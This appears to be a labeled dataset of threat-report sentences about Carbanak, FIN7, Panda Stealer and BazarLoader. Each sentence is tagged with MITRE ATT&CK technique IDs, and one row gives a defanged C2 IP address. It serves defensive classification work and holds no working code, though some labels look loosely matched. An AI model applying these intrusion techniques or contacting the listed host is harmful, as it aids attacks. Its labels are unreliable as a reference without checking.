text1	labels
Carbanak campaigns can also use legitimate programs and remote access software for command and control. They also employ standard non-application layer protocols for communication.	['T1095']
After this, the Carbanak backdoor can then be used to log keystrokes and capture screenshots, steal and delete cookies, inject malicious code on sites, and monitor various traffic. For lateral movement, the malware abuses remote and system administration tools.	['T1539', 'T1113', 'T1550.004', 'T1020.001', 'T1056.003']
For FIN7 attack routines, data can be compressed and/or encrypted before being exfiltrated.	['T1560']
FIN7 gathers information on network shares.	['T1039']
The other infection chain involves an attached .XLS file containing an Excel formula that utilizes a PowerShell command (Figure 2) to access paste.ee, a Pastebin alternative, that accesses a second encrypted PowerShell command (Figure 3).	['T1059', 'T1566.001', 'T1059.001']
In Carbanak attacks, the groups’ attacks can involve logging into services that accept remote connections and using stolen password hashes through the “pass the hash” method	['T1550.002', 'T1110.002']
On the other hand, FIN7 takes advantage of Mshta, a utility that can execute VBScript, and scheduled tasks to run malicious code on user systems.	['T1053.005', 'T1053', 'T1218.005']
In both Carbanak and FIN7 attacks, communication with users’ compromised systems is done through bypassing firewalls or network detection systems via commonly used ports, using connection proxies to avoid direct connections to the threat group’s infrastructure, employing the command-and-control channel to remotely copy files from an external system, blending in with existing network traffic by using standard application layer protocol, and taking advantage of standard cryptographic protocol to disguise command-and-control traffic.	['T1090']
Panda Stealer is deployed through spam emails posing as business quote requests to lure unwary victims into opening malicious Excel files. We have identified two infection chains: in one, an .XLSM attachment contains macros that download a loader (Figure 1). Then, the loader downloads and executes the main stealer. 	['T1598.002', 'T1566.001', 'T1137.001']
FIN7 attacks can and inject code into processes and hijack the search order used to load DLL files.	['T1574.001']
Decoding these PowerShell scripts revealed that they are used to access paste.ee URLs for easy implementation of fileless payloads. The CallByName export function in Visual Basic is used to call the load of a .NET assembly within memory from a paste.ee URL.	['T1059.005', 'T1059.001']
Carbanak also collects information on accounts, files and directories, group permissions, and registries.	['T1083']
FIN7 utilizes guardrails to restrict execution and abused utilities that allow indirect command execution that can go past security restrictions	['T1480']
After moving through the network and identifying assets to target, the next step would be to gather key data. At the collection phase, Carbanak and FIN7 campaigns harvest data from local system sources and through input and screen capture (as performed in a related campaign using the Tirion malware).	['T1113', 'T1056']
They also add programs to a startup folder that can be referenced with a registry run key. We detected a variant of the Carbanak malware that adds registry entries and keys as an autostart technique. Credentials of existing valid accounts were also abused.	['T1547.001']
Cobalt Strike was also used to continuously communicate with the main command-and-control (C&C) server.	['T1587.001', 'T1583.004']
This example of BazarLoader generated command and control (C2) activity, retrieving BazarBackdoor using HTTPS traffic from 104.248.174[.]225 over TCP port 443.	['T1043']
